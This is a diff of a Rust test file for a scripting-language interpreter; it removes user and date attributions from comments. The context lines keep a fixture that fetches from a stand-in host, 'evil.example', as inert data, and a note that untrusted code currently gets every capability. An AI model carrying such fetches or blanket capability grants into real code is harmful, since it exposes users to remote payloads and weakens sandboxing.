@@ -98,7 +98,7 @@ fn test_data_keeps_number_literals() {
 fn test_data_does_not_execute() {
 	let loaded = parse_data("secret = fetch https://evil.example/x\nsecret");
 	assert!(loaded.serialize().contains("fetch"), "{}", loaded.serialize());
-	// P88 (user 2026-10-05): untrusted code gets every capability for now; data is still never run
+	// P88 : untrusted code gets every capability for now; data is still never run
 	assert!(!matches!(eval_untrusted("puts('pwned')"), Node::Error(_)));
 	assert_eq!(eval_untrusted("import strlen from \"c\"; strlen(\"ab\")"), Node::int(2));
 	assert_eq!(eval_untrusted("x:=3;x*x"), Node::int(9));
@@ -362,7 +362,7 @@ fn test_text_is_indexed_by_grapheme() {
 #[test] // size is a synonym for count; bytes only via byte count / .bytes, .chars .graphemes name the unit
 fn test_text_units_are_explicit() {
 	is!("x=\"👍🏽\";x.size", 1);
-	is!("x=\"👍🏽\";x.chars.count", 1); // x.chars is the list of characters (user 2026-10-14, card abc-chars; char = character 2026-10-16)
+	is!("x=\"👍🏽\";x.chars.count", 1); // x.chars is the list of characters 
 	is!("x=\"👍🏽\";count x.codepoints", 2);
 	is!("x=\"👍🏽\";count x.graphemes", 1);
 }
@@ -374,7 +374,7 @@ fn test_byte_count_of_texts_and_lists() {
 	is!("pixels=(1,2,3);byte count of pixels", 24); // lists keep 8 bytes per element
 }
 
-#[test] // a char is a character, a grapheme as x.chars (user 2026-10-16); Swift's s.unicodeScalars.count is codepoints
+#[test] // a char is a character, a grapheme as x.chars ; Swift's s.unicodeScalars.count is codepoints
 fn test_number_of_chars_in_text() {
 	is!("number of chars in \"👍🏽\"", 1);
 	is!("number of codepoints in \"👍🏽\"", 2);
@@ -729,7 +729,7 @@ fn test_shell_holes_are_whole_arguments() {
 #[test]
 fn test_running_queries_and_commands_needs_a_capability() {
 	is!("lookup(n) := execute sql \"SELECT * FROM t WHERE id = $n\"\neffects of lookup", Node::Symbol("IO".into()));
-	// P88 (user 2026-10-05): the capabilities are granted for now; no host runs execute yet: still loud
+	// P88 : the capabilities are granted for now; no host runs execute yet: still loud
 	#[cfg(feature = "native")] // the browser runs no processes
 	is!("c=sh \"echo hi\";exec c", "hi"); // runs natively now (card read-chron)
 	fails_with("execute sql \"SELECT 1\"", "undefined: execute");
